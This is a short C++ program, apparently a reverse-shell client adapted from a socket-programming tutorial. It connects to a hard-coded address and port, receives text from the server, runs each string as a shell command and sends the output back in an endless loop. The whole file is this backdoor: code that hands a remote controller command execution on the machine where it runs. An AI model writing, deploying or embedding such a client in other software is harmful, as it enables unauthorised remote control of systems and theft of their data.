/*
*   The client socket programming code is from Sloan Kelly's YouTube video:
*   https://www.youtube.com/watch?v=fmn-pRvNaho
*/


#include <iostream>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <string>

#include "utils.cpp"


int port = 54000;
std::string ipAddress = "127.0.0.1";

int main()
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1)
    {
        std::cout << "[-] Failed to create socket" << std::endl;
        return -1;
    }
    
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr); 
    
    int connectRes = connect(sock, (sockaddr*)&hint, sizeof(hint));
    if (connectRes == -1)
    {
        std::cout << "[-] Failed to connect" << std::endl;
        return -1;
    }
    
    int bufSize = 4096;
    char buffer[bufSize];
    
    do {
        memset(buffer, 0, bufSize);
        
        int bytesRecv = recv(sock, buffer, bufSize, 0);
        
        /* HANDLE COMMANDS */
        std::string command = std::string(buffer, bytesRecv);
        std::cout << "[+] COMMAND > '" << command << "'" << std::endl;

        // Execute command and return command output
        std::string output = get_cmd_output(command);
        std::cout << "[+] OUTPUT > " << output << std::endl;
        
        
        // Send command output
        int sendRes = send(sock, output.c_str(), output.size() + 1, 0);
        if(sendRes == -1)
        {
            std::cout << "[-] Could not send to server." << std::endl;
            continue;
        }

    } while (true);
    close(sock);
}




